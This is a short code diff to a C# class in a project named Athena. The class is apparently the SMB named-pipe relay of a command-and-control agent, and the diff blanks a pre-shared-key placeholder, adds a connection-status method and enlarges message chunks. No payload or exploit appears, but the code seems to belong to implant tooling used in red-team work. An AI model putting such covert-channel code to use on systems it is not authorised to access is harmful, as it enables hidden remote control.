@@ -53,7 +53,7 @@ namespace Athena
         {
             uuid = "%UUID%";
             this.connected = false;
-            this.psk = "AESPSK";
+            this.psk = "";
             this.queueIn = new BlockingCollection<DelegateMessage>();
             if (!string.IsNullOrEmpty(this.psk))
             {
@@ -71,6 +71,10 @@ namespace Athena
             this.serverPipe.StartAsync();
 
             Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
+        }
+        public async Task<bool> IsConnected()
+        {
+            return this.connected;
         }
 
         private async void OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
@@ -163,7 +167,7 @@ namespace Athena
                     final = false
                 };
 
-                IEnumerable<string> parts = json.SplitByLength(50000);
+                IEnumerable<string> parts = json.SplitByLength(65000);
 
                 //hunk the message and send the parts
                 Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {json.Length} in {parts.Count()} chunks.");
